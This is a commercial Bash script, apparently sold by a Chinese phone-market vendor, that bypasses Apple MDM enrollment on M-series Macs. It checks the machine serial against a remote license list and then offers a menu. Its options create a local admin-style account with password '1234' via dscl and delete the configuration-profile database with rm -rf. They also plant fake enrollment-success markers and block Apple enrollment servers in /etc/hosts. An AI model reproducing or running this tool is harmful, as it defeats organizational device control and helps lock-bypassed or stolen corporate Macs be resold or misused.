#!/bin/bash
# ==========================================================
#        HUA QIANG BEI XIAO HU - M-SERIES ULTIMATE (V25)
# ==========================================================

RED='\033[1;31m'
GRN='\033[1;32m'
YLW='\033[1;33m'
BLU='\033[1;34m'
CYN='\033[1;36m'
NC='\033[0m'

# 1. 联网监测 (仅授权使用)
check_network() {
    printf "${CYN}[授权查询] 正在验证...${NC}\n"
    if ! ping -c 1 -W 2 baidu.com >/dev/null 2>&1; then
        printf "${RED}❌ 请先连接网络通过序列号验证！${NC}\n"
        exit 1
    fi
}

# 2. 序列号验证
verify_sn() {
    SN=$(ioreg -l | grep IOPlatformSerialNumber | awk -F'"' '{print $4}' | xargs)
    printf "${CYN}本机 SN: ${YLW}$SN${NC}\n"
    CHECK=$(curl -fsSL "https://humdm.github.io/mdm-tools/sn.txt?$(date +%s)" | tr -d '\r' | grep -w "$SN")
    if [ -z "$CHECK" ]; then
        printf "${RED}❌ 未获授权！联系微信: huhu-019${NC}\n"
        exit 1
    fi
    printf "${GRN}✅ 验证通过！${NC}\n"
}

# 3. 进度条
show_progress() {
    printf "${BLU}[$1]${NC}\n${GRN}["
    for i in {1..50}; do printf "■"; sleep 0.005; done
    printf "] 100%%${NC}\n\n"
}

# 初始化
check_network
verify_sn

while true; do
    printf "\n${GRN}  ★ 华强北小胡 - M4/M系列深度粉碎版 ★${NC}\n"
    printf "    ${YLW}1)${NC} ${BLU}恢复模式专用 (一键绕过)${NC}\n"
    printf "    ${YLW}2)${NC} ${BLU}桌面模式补救 (彻底粉碎残留弹窗)${NC}\n"
    printf "    ${YLW}3)${NC} ${BLU}查看监管状态${NC}\n"
    printf "    ${YLW}4)${NC} ${BLU}强制重启${NC}\n"
    printf "    ${RED}q)${NC} 退出\n"
    printf "  请选择: "
    read opt < /dev/tty
    case $opt in
        1)
            show_progress "正在注入 M 系列核心补丁"
            # 暴力路径锁定
            D_PATH="/Volumes/Data"
            S_PATH=$(df | grep "/Volumes/" | grep -v "Data" | grep -v "Image" | head -n 1 | awk '{for(i=6;i<=NF;i++) printf $i" "; print ""}' | xargs)
            # 注入账户
            dscl -f "$D_PATH/private/var/db/dslocal/nodes/Default" localhost -create "/Local/Default/Users/MacBook" >/dev/null 2>&1
            dscl -f "$D_PATH/private/var/db/dslocal/nodes/Default" localhost -passwd "/Local/Default/Users/MacBook" "1234"
            # 核心粉碎：物理删除配置文件夹
            rm -rf "$S_PATH/var/db/ConfigurationProfiles"/*
            mkdir -p "$S_PATH/var/db/ConfigurationProfiles/Settings"
            touch "$S_PATH/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled"
            # 封锁 Hosts
            printf "0.0.0.0 deviceenrollment.apple.com\n0.0.0.0 mdmenrollment.apple.com\n0.0.0.0 iprofiles.apple.com\n" >> "$S_PATH/etc/hosts"
            printf "${GRN}★ 恢复模式处理完毕！请重启。★${NC}\n"
            ;;
        2)
            echo -e "\n${RED}⚠️ 请务必先手动关闭 Wi-Fi！断网是成功的关键。${NC}"
            if sudo -v; then
                show_progress "执行桌面深度粉碎"
                # 1. 停止管理进程
                sudo launchctl unload /System/Library/LaunchDaemons/com.apple.ManagedClient.enroll.plist 2>/dev/null
                # 2. 彻底删除监管数据库
                sudo rm -rf /var/db/ConfigurationProfiles/*
                # 3. 注入虚假成功标记
                sudo mkdir -p /var/db/ConfigurationProfiles/Settings
                sudo touch /var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
                sudo touch /var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound
                printf "${GRN}✅ 粉碎完成！请立即执行选项 4 重启。${NC}\n"
            fi
            ;;
        3)
            sudo profiles show -type enrollment
            read -p "按回车返回..." < /dev/tty
            ;;
        4) sudo reboot ;;
        q) exit 0 ;;
    esac
done
